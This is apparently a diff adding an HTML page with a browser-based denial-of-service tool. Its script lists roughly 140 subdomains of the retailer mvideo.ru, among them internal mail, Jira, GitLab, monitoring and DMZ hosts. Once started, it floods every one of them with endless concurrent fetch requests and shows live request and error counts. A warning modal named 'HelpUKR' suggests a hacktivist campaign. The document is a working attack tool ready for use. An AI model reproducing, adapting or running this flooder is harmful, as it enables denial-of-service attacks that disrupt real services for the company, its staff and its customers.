+            'http://pyatigorsk.mvideo.ru',
+            'http://www2.mvideo.ru',
+            'http://nkamsk.mvideo.ru',
+            'http://cherkessk.mvideo.ru',
+            'http://nn.mvideo.ru',
+            'http://img.mvideo.ru',
+            'http://tolyatti.mvideo.ru',
+            'http://petrozavodsk.mvideo.ru',
+            'http://kirov.mvideo.ru',
+            'http://delivery-ci360-test.mvideo.ru',
+            'http://konkurs-obzorov.mvideo.ru',
+            'http://karma.test.cs-aws.mvideo.ru',
+            'http://mattermost.sandbox.tech.mvideo.ru',
+            'http://content-ci360-dev.mvideo.ru',
+            'http://jaeger-collector.web.production-pilot.ya.tp.mvideo.ru',
+            'http://admin.show.mvideo.ru',
+            'http://test.mmgift.mvideo.ru',
+            'http://agent.mvideo.ru',
+            'http://igra1.mvideo.ru',
+            'http://dr-edge01.mvideo.ru',
+            'http://mstudy-qas.mvideo.ru',
+            'http://www.pi-qas.mvideo.ru',
+            'http://battle.mvideo.ru',
+            'http://smile.mvideo.ru',
+            'http://vladikavkaz.mvideo.ru',
+            'http://kazan.mvideo.ru',
+            'http://officewebapp.mvideo.ru',
+            'http://grafana.cs.cs.cs-aws.mvideo.ru',
+            'http://krasnodar.mvideo.ru',
+            'http://oskol.mvideo.ru',
+            'http://football.mvideo.ru',
+            'http://eum.mapp-appl.mvideo.ru',
+            'http://guidlines.mvideo.ru',
+            'http://partners.mvideo.ru',
+            'http://amelia.mvideo.ru',
+            'http://aw-tu-dmz.mvideo.ru',
+            'http://service.mvideo.ru',
+            'http://ugansk.mvideo.ru',
+            'http://perm.mvideo.ru',
+            'http://2019.mvideo.ru',
+            'http://www.igra.mvideo.ru',
+            'http://aw-sg-exch.mvideo.ru',
+            'http://ep.mvideo.ru',
+            'http://pskov.mvideo.ru',
+            'http://execution-ci360-dev.mvideo.ru',
+            'http://ahr.mvideo.ru',
+            'http://igra2.mvideo.ru',
+            'http://autodiscover.mvideo.ru',
+            'http://omni.mvideo.ru',
+            'http://help.b2b.mvideo.ru',
+            'http://viber.mvideo.ru',
+            'http://hockey.mvideo.ru',
+            'http://promo-configurator-prod.pnp.cs-aws.mvideo.ru',
+            'http://snowboard.mvideo.ru',
+            'http://jira.mvideo.ru',
+            'http://job.mvideo.ru',
+            'http://mstudy.mvideo.ru',
+            'http://ufa.mvideo.ru',
+            'http://spb.mvideo.ru',
+            'http://www.krasnodar.mvideo.ru',
+            'http://chelyabinsk.mvideo.ru',
+            'http://test-acme-ssl-01.mvideo.ru',
+            'http://app.mvideo.ru',
+            'http://sentry.tech.mvideo.ru',
+            'http://salavat.mvideo.ru',
+            'http://diablo.mvideo.ru',
+            'http://harbor.services.tp.mvideo.ru',
+            'http://autofaq.mvideo.ru',
+            'http://svn.mvideo.ru',
+            'http://static.mvideo.ru',
+            'http://mail.mvideo.ru',
+            'http://faq.mvideo.ru',
+            'http://kaluga.mvideo.ru',
+            'http://foto.mvideo.ru',
+            'http://nnovgorod.mvideo.ru',
+            'http://www.spb.mvideo.ru',
+            'http://execution-ci360.mvideo.ru',
+            'http://whirlpool.mvideo.ru',
+            'http://www.mvideo.ru',
+            'http://gitlab.tech.mvideo.ru',
+            'http://aw-fe-dmz01.corp.mvideo.ru',
+            'http://aw-fe-dmz02.corp.mvideo.ru',
+            'http://hackathon.mvideo.ru',
+            'http://filmgame.mvideo.ru',
+            'http://meet.mvideo.ru',
+            'http://mta01.mvideo.ru',
+            'http://mm.mvideo.ru',
+            'http://eks.web.prod.aws.tp.mvideo.ru',
+            'http://dr-edge02.mvideo.ru',
+            'http://b2b.mvideo.ru',
+            'http://ftp.mvideo.ru',
+            'http://mail2.mvideo.ru',
+            'http://ntagil.mvideo.ru',
+            'http://tomsk.mvideo.ru',
+            'http://volgograd.mvideo.ru',
+            'http://vologda.m.mvideo.ru',
+            'http://karma.cs.cs.cs-aws.mvideo.ru',
+            'http://cheboksary.mvideo.ru',
+            'http://pricing-engine-dev.pnp.cs-aws.mvideo.ru',
+            'http://n-vartovsk.mvideo.ru',
+            'http://promo-configurator-dev.test.cs-aws.mvideo.ru',
+            'http://tvbonus.mvideo.ru',
+            'http://kemerovo.mvideo.ru',
+            'http://yaroslavl.mvideo.ru',
+            'http://omni-qas.mvideo.ru',
+            'http://8.mvideo.ru',
+            'http://lyncdiscover.mvideo.ru',
+            'http://syktyvkar.mvideo.ru',
+            'http://hanti.mvideo.ru',
+            'http://penza.mvideo.ru',
+            'http://barnaul.mvideo.ru',
+            'http://ar2018.invest.mvideo.ru',
+            'http://l.mvideo.ru',
+            'http://prometheus.test.cs-aws.mvideo.ru',
+            'http://mattermost2.sandbox.tech.mvideo.ru',
+            'http://ns.mvideo.ru',
+            'http://sp.mvideo.ru',
+            'http://api.mvideo.ru',
+            'http://delivery-ci360-dev.mvideo.ru',
+            'http://img-atgplt.mvideo.ru',
+            'http://omsk.mvideo.ru',
+            'http://sapme.mvideo.ru',
+            'http://krasnoyarsk.mvideo.ru',
+            'http://mgame.mvideo.ru',
+            'http://edge01.mvideo.ru',
+            'http://tmg01.mvideo.ru',
+            'http://ulan-ude.mvideo.ru',
+            'http://tobolsk.mvideo.ru',
+            'http://show.mvideo.ru',
+            'http://kube-test.mvideo.ru',
+            'http://igra.mvideo.ru',
+            'http://pi-qas.mvideo.ru',
+            'http://jaeger.test.cs-aws.mvideo.ru',
+            'http://www.lyncsip.mvideo.ru',
+            'http://aw-fe-dmz03.corp.mvideo.ru',
+            'http://proxy.tp.mvideo.ru',
+            'http://proxy.tp.mvideo.ru',
+        ];
+        // initialize variables
+        var targets = urls.reduce((o, key) => ({ ...o, [key]: {number_of_requests: 0, number_of_errored_responses: 0}}), {})
+        var statRow = document.querySelector("#stats > .row");
+        var myModal = new bootstrap.Modal(document.getElementById('HelpUKR-WarningBox'), {});
+        var CONCURRENCY_LIMIT = 200;
+        var queue = [];
+        var attack = false;
+        var totalrequests = 0;
+        var totalerrors = 0;
+        function togglePause () {
+            if (attack) {
+                attack = false;
+                document.querySelector("div.desc .btn").innerText = "Resume";
+            } else {
+                attack = true;
+                document.querySelector("div.desc .btn").innerText = "Pause";
+                for (var i=0; i<urls.length; i++) {
+                    flood(i);
+                }
+            }
+        }
+        async function fetchWithTimeout(resource, options) {
+            const controller = new AbortController();
+            const id = setTimeout(() => controller.abort(), options.timeout);
+            return fetch(resource, {
+                signal: controller.signal,
+                mode: 'no-cors'
+            }).then((response) => {
+                clearTimeout(id);
+                return response;
+            }).catch((error) => {
+                clearTimeout(id);
+                throw error;
+            });
+        }
+        async function sleep(ms) {
+            return new Promise(r => setTimeout(r, ms));
+        }         
+        async function flood(n) {
+            const url = urls[n];
+            const target = targets[url];
+            while (attack) {
+                if (queue.length > CONCURRENCY_LIMIT) {
+                    await queue.shift();
+                }
+                queue.push(
+                    fetchWithTimeout(url, { timeout: 2000 })
+                        .catch((error) => {
+                            if (error.code === 20 /* ABORT */) {
+                                return;
+                            }
+                            target.number_of_errored_responses++;
+                            target.error_message = error.message;
+                            totalerrors++;
+                        })
+                        .then((response) => {
+                            if (response && !response.ok) {
+                                target.number_of_errored_responses++;
+                                target.error_message = response.statusText;
+                                totalerrors++;
+                            }
+                            target.number_of_requests++;
+                        })
+                        .finally(() => updateTargetDisplay(n))
+                );
+                await sleep(1);
+            }
+        }
+        // Update data for target n
+        function updateTargetDisplay(n) {
+            var url = urls[n];
+            var {number_of_requests, number_of_errored_responses} = targets[url];
+            var requests_cell = document.querySelector(`#target${n} .requests`);
+            var errors_cell = document.querySelector(`#target${n} .errors`);
+            requests_cell.innerText = number_of_requests;
+            errors_cell.innerText = number_of_errored_responses;
+            document.querySelector("#totalrequests").innerText = totalrequests;
+            document.querySelector("#totalerrors").innerText = totalerrors;
+        }
+        // Shuffle array order before starting
+        for (let i = urls.length - 1; i > 0; i--) {
+            const j = Math.floor(Math.random() * (i + 1));
+            [urls[i], urls[j]] = [urls[j], urls[i]];
+        }
+        // Create div for each target
+        for (var i=0; i<urls.length; i++) {
+            statRow.innerHTML += `
+                <div class="col-lg-3 col-md-4 col-sm-6" id="target${i}">
+                  <h4>${urls[i]}</h4>
+                    <table class='status'>
+                      <tr><td>requests:</td><td class="requests">0</td></tr>
+                      </tr><td>errors:</td><td class="errors">0</td></tr>
+                    </table>
+                  </div>
+            `;
+        }
+        // Show warning window
+        myModal.toggle();
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+  gtag('config', 'UA-85513613-1');
+</script>
+<script>
+// BETA plugin for estimated requested data
+(function($) {
+  $.fn.countTo = function(options) {
+    return this.each(function() {
+      //-- Arrange
+      var FRAME_RATE = 60; // Predefine default frame rate to be 60fps
+      var $el = $(this);
+      var countFrom = parseInt($el.attr('data-count-from'));
+      var countTo = parseInt($el.attr('data-count-to'));
+      var countSpeed = $el.attr('data-count-speed'); // Number increment per second
+
+      //-- Action
+      var rafId;
+      var increment;
+      var currentCount = countFrom;
+      var countAction = function() {              // Self looping local function via requestAnimationFrame
+        if(currentCount < countTo) {              // Perform number incremeant
+          $el.text(Math.floor(currentCount));     // Update HTML display
+          increment = countSpeed / FRAME_RATE;    // Calculate increment step
+          currentCount += increment;              // Increment counter
+          rafId = requestAnimationFrame(countAction);
+        } else {                                  // Terminate animation once it reaches the target count number
+          $el.text(countTo);                      // Set to the final value before everything stops
+          //cancelAnimationFrame(rafId);
+        }
+      };
+      rafId = requestAnimationFrame(countAction); // Initiates the looping function
+    });
+  };
+}(jQuery));
+
+//-- Executing
+$('.number-counter').countTo();
+</script>
+</html>
